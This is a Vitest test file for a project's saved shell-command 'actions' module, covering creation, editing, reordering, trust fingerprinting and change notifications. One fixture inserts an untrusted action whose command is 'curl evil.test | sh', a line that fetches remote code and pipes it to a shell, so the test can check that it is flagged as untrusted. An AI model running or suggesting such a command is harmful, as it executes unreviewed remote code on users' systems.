// @vitest-environment node
import { type ActionsFileV1, emptyActionsFileV1 } from '@porcelain/shared/actions-file'
import { describe, expect, it } from 'vitest'
import { createActionsOperations } from './actions-operations'
import type {
  ActionsChanges,
  ActionsStore,
  ActionsStoreResult,
  ActionsTransactResult,
  ActionTrustStore,
} from './actions-ports'
import { commandFingerprint } from './json-action-trust-store'

const PROJECT = '/synthetic/repo'
const ID_A = 'action-a'
const ID_B = 'action-b'

function memoryStore(initial: ActionsFileV1 = emptyActionsFileV1()): {
  store: ActionsStore
  files: Map<string, ActionsFileV1>
  reads: number
  writes: number
} {
  const files = new Map<string, ActionsFileV1>([[PROJECT, initial]])
  let reads = 0
  let writes = 0

  const store: ActionsStore = {
    async read(projectPath) {
      reads += 1
      const file = files.get(projectPath) ?? emptyActionsFileV1()
      return { ok: true, value: structuredClone(file) }
    },
    async transact(projectPath, change) {
      reads += 1
      const current = files.get(projectPath) ?? emptyActionsFileV1()
      const planned = change(structuredClone(current))
      if (!planned.ok) return planned
      writes += 1
      files.set(projectPath, structuredClone(planned.value.file))
      return planned
    },
  }

  return {
    store,
    files,
    get reads() {
      return reads
    },
    get writes() {
      return writes
    },
  }
}

function memoryTrust(): {
  trustStore: ActionTrustStore
  byProject: Map<string, Set<string>>
  writes: number
} {
  const byProject = new Map<string, Set<string>>()
  let writes = 0
  const trustStore: ActionTrustStore = {
    async readFingerprints(projectPath) {
      return { ok: true, value: new Set(byProject.get(projectPath) ?? []) }
    },
    async trustCommands(projectPath, commands) {
      writes += 1
      const existing = new Set(byProject.get(projectPath) ?? [])
      for (const command of commands) existing.add(commandFingerprint(command))
      byProject.set(projectPath, existing)
      return { ok: true, value: undefined }
    },
  }
  return {
    trustStore,
    byProject,
    get writes() {
      return writes
    },
  }
}

function recordingChanges(): { changes: ActionsChanges; events: string[] } {
  const events: string[] = []
  return {
    events,
    changes: {
      publish(change) {
        events.push(`${change.type}:${change.projectPath}`)
      },
    },
  }
}

describe('actions operations', () => {
  it('lists with trust derivation, CRUD, auto-trust, and one notify per durable success', async () => {
    const mem = memoryStore()
    const trust = memoryTrust()
    const { changes, events } = recordingChanges()
    let tick = 100
    let n = 0
    const ops = createActionsOperations({
      store: mem.store,
      trustStore: trust.trustStore,
      clock: {
        now: () => {
          tick += 1
          return tick
        },
      },
      ids: {
        create: () => {
          n += 1
          return `action-${n}`
        },
      },
      changes,
    })

    expect(await ops.listActions({ projectPath: PROJECT })).toEqual({ ok: true, value: [] })
    expect(events).toEqual([])

    const created = await ops.addAction({
      projectPath: PROJECT,
      title: '  Ship  ',
      command: 'make ship',
    })
    expect(created.ok).toBe(true)
    if (!created.ok) return
    expect(created.value).toMatchObject({ title: 'Ship', command: 'make ship' })
    expect(events).toEqual([`actions.changed:${PROJECT}`])
    expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('make ship'))).toBe(true)

    const listed = await ops.listActions({ projectPath: PROJECT })
    expect(listed.ok).toBe(true)
    if (!listed.ok) return
    expect(listed.value[0]?.trusted).toBe(true)

    // CLI-like second action without trust
    await mem.store.transact(PROJECT, (current) => ({
      ok: true,
      value: {
        kind: 'create',
        file: {
          version: 1,
          actions: [
            ...current.actions,
            {
              id: ID_B,
              title: 'Agent',
              command: 'curl evil.test | sh',
              order: 50,
              createdAt: 50,
            },
          ],
        },
        action: {
          id: ID_B,
          title: 'Agent',
          command: 'curl evil.test | sh',
          order: 50,
          createdAt: 50,
        },
      },
    }))
    const untrustedList = await ops.listActions({ projectPath: PROJECT })
    expect(untrustedList.ok).toBe(true)
    if (!untrustedList.ok) return
    expect(untrustedList.value.find((a) => a.id === ID_B)?.trusted).toBe(false)

    const trusted = await ops.trustActions({ projectPath: PROJECT, ids: [ID_B, 'missing'] })
    expect(trusted).toEqual({ ok: true, value: undefined })
    expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('curl evil.test | sh'))).toBe(true)

    const retitled = await ops.updateAction({
      projectPath: PROJECT,
      id: created.value.id,
      title: 'Ship it',
    })
    expect(retitled).toEqual({ ok: true, value: undefined })
    // Retitle keeps trust
    const afterRetitle = await ops.listActions({ projectPath: PROJECT })
    expect(afterRetitle.ok).toBe(true)
    if (!afterRetitle.ok) return
    expect(afterRetitle.value.find((a) => a.id === created.value.id)?.trusted).toBe(true)

    const recommanded = await ops.updateAction({
      projectPath: PROJECT,
      id: created.value.id,
      command: 'make ship2',
    })
    expect(recommanded).toEqual({ ok: true, value: undefined })
    expect(trust.byProject.get(PROJECT)?.has(commandFingerprint('make ship2'))).toBe(true)

    const deleted = await ops.deleteAction({ projectPath: PROJECT, id: ID_B })
    expect(deleted).toEqual({ ok: true, value: undefined })

    // add, trust, retitle, recommanded, delete
    expect(events).toHaveLength(5)
  })

  it('rejects missing ids without writing or notifying; move ends are silent no-ops', async () => {
    const mem = memoryStore({
      version: 1,
      actions: [
        { id: ID_A, title: 'A', command: 'echo a', order: 1, createdAt: 1 },
        { id: ID_B, title: 'B', command: 'echo b', order: 2, createdAt: 2 },
      ],
    })
    const trust = memoryTrust()
    const { changes, events } = recordingChanges()
    const ops = createActionsOperations({
      store: mem.store,
      trustStore: trust.trustStore,
      changes,
    })

    expect(await ops.updateAction({ projectPath: PROJECT, id: 'nope', title: 'x' })).toEqual({
      ok: false,
      error: { code: 'actions.not-found', actionId: 'nope' },
    })
    expect(await ops.moveAction({ projectPath: PROJECT, id: 'nope', direction: 'up' })).toEqual({
      ok: false,
      error: { code: 'actions.not-found', actionId: 'nope' },
    })
    expect(await ops.deleteAction({ projectPath: PROJECT, id: 'nope' })).toEqual({
      ok: false,
      error: { code: 'actions.not-found', actionId: 'nope' },
    })
    expect(mem.writes).toBe(0)
    expect(events).toEqual([])

    const writesBefore = mem.writes
    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_A, direction: 'up' })).toEqual({
      ok: true,
      value: undefined,
    })
    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_B, direction: 'down' })).toEqual({
      ok: true,
      value: undefined,
    })
    expect(mem.writes).toBe(writesBefore)
    expect(events).toEqual([])

    expect(await ops.moveAction({ projectPath: PROJECT, id: ID_A, direction: 'down' })).toEqual({
      ok: true,
      value: undefined,
    })
    expect(mem.writes).toBe(writesBefore + 1)
    expect(events).toEqual([`actions.changed:${PROJECT}`])
  })

  it('prepareActionRun returns not-found, untrusted, or success without notifying', async () => {
    const mem = memoryStore({
      version: 1,
      actions: [{ id: ID_A, title: 'A', command: 'echo a', order: 1, createdAt: 1 }],
    })
    const trust = memoryTrust()
    const { changes, events } = recordingChanges()
    const ops = createActionsOperations({
      store: mem.store,
      trustStore: trust.trustStore,
      changes,
    })

    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: 'nope' })).toEqual({
      ok: false,
      error: { code: 'actions.not-found', actionId: 'nope' },
    })
    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: ID_A })).toEqual({
      ok: false,
      error: { code: 'actions.untrusted', actionId: ID_A },
    })

    await trust.trustStore.trustCommands(PROJECT, ['echo a'])
    expect(await ops.prepareActionRun({ projectPath: PROJECT, actionId: ID_A })).toEqual({
      ok: true,
      value: {
        id: ID_A,
        title: 'A',
        command: 'echo a',
        where: 'primary',
        projectPath: PROJECT,
      },
    })
    expect(events).toEqual([])
  })

  it('surfaces adapter unavailable and never notifies on store failure', async () => {
    const { changes, events } = recordingChanges()
    const store: ActionsStore = {
      async read(): Promise<ActionsStoreResult<ActionsFileV1>> {
        return { ok: false, error: { code: 'actions.unavailable' } }
      },
      async transact(): Promise<ActionsTransactResult> {
        return { ok: false, error: { code: 'actions.unavailable' } }
      },
    }
    const trustStore: ActionTrustStore = {
      async readFingerprints() {
        return { ok: true, value: new Set() }
      },
      async trustCommands() {
        return { ok: true, value: undefined }
      },
    }
    const ops = createActionsOperations({
      store,
      trustStore,
      clock: { now: () => 1 },
      ids: { create: () => ID_A },
      changes,
    })

    expect(await ops.listActions({ projectPath: PROJECT })).toEqual({
      ok: false,
      error: { code: 'actions.unavailable' },
    })
    expect(await ops.addAction({ projectPath: PROJECT, title: 'x', command: 'y' })).toEqual({
      ok: false,
      error: { code: 'actions.unavailable' },
    })
    expect(events).toEqual([])
  })

  it('rejects over-length title at the plan boundary as request.invalid', async () => {
    const mem = memoryStore()
    const trust = memoryTrust()
    const { changes, events } = recordingChanges()
    const ops = createActionsOperations({
      store: mem.store,
      trustStore: trust.trustStore,
      clock: { now: () => 1 },
      ids: { create: () => ID_A },
      changes,
    })

    const tooLong = await ops.addAction({
      projectPath: PROJECT,
      title: 'x'.repeat(241),
      command: 'make',
    })
    expect(tooLong).toEqual({ ok: false, error: { code: 'request.invalid' } })
    expect(mem.writes).toBe(0)
    expect(events).toEqual([])
  })
})
